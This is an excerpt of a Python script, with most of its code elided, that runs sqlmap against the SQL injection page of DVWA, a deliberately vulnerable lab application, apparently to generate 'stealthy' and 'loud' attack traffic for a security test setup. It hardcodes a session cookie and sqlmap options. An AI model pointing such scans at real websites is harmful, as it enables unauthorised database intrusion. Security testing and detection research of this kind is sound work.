#!/usr/bin/env python3
"""
Web attack script - Phase 1, Category 5 (SQL Injection via SQLmap).
Runs sqlmap against DVWA's SQLi vulnerability page.
...
CLOUD = "aws"
SESSION_ID_COOKIE = "7ac4fc3d723994a7451fed1835c4d5f4"  # update if session expires
...
if __name__ == "__main__":
    ...
    for i in range(1, num_sessions + 1):
        if i % 3 == 0:
            # Stealthy: basic detection test only, minimal requests
            run_sqlmap(i, "stealthy_sqli", "--level=1 --risk=1", "stealthy")
        else:
            # Loud: fuller enumeration attempt
